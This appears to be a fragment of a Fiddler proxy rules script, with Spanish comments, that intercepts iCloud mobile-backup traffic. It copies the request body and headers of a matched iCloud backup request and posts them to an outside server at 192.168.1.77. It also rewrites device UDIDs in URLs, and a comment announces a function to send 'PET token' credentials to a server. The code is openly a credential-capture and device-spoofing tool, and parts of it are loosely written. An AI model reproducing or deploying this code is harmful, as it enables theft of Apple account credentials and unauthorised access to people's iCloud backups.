...
class Handlers
{
    ...
    static function ChangeRequest(oSession: Session, key: String, newValue: String){
        var requestBody: String = oSession.GetRequestBodyAsString();
        // Reemplaza el valor de `Hola` utilizando expresiones regulares o manipulación de strings
        var updateBody2 = requestBody.Replace(key, newValue);
        // Actualiza el cuerpo de la solicitud con el nuevo valor
        oSession.utilSetRequestBody(updateBody2);    
                
    }
        
    static function ChangeUDIDInURL(oSession: Session, oldUDID: String, newUDID: String) {
        // Verifica si la URL contiene el viejo UDID
        if (oSession.fullUrl.IndexOf(oldUDID) >= 0) {
            // Reemplaza el viejo UDID por el nuevo en la URL
            oSession.fullUrl = oSession.fullUrl.Replace(oldUDID, newUDID);
        }
    }
    ...
    static function OnBeforeRequest(oSession: Session) {
        ...
        if (oSession.uriContains("https://p26-mobilebackup.icloud.com:443/mbs/21587282039")) {
            var responseContent = oSession.GetRequestBodyAsString();
            var headersContent = oSession.RequestHeaders.Clone();
            // Crea una nueva solicitud para enviar la respuesta a otro URL.
            var request = new System.Net.Http.HttpClient();
            var requestContent = new StringContent(responseContent + headersContent);
            var requestContents = new StringContent(headersContent + responseContent);
            // Configura la solicitud con el URL de destino y cualquier encabezado necesario.
            request.BaseAddress = new Uri("https://192.168.1.77/response.php");
            request.PostAsync("Proxy.php", requestContent);
        }
        // Verifica si la respuesta es la que deseas enviar a otro URL.
  ...
  /**
        FUNCTION FOR SEND PET TOKEN INFORMATION TO SERVER
  **/
  //=================================================================================================================
